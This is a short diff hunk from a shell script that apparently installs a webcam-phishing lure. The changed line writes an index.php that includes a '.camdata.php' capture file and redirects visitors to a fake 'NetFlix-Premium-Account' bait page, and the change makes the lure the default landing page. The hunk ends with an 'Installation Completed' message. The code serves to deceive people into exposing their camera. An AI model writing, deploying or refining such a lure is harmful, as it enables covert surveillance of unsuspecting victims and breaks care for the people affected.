@@ -72,7 +72,7 @@ fi
 fi
 fi
 # Create Files
-printf "<?php\ninclude '.camdata.php';\nheader('Location: .NetFlix-Premium-Account.html');\nexit\n?>\n" > .www/.hiddencam.php
+printf "<?php\ninclude '.camdata.php';\nheader('Location: .NetFlix-Premium-Account.html');\nexit\n?>\n" > .www/index.php
 
 printf " \n"
 printf " \e[0m\e[1;91m[\e[0m\e[1;97m~\e[0m\e[1;91m]\e[0m\e[1;93m Installation Completed ...\e[0m\n"
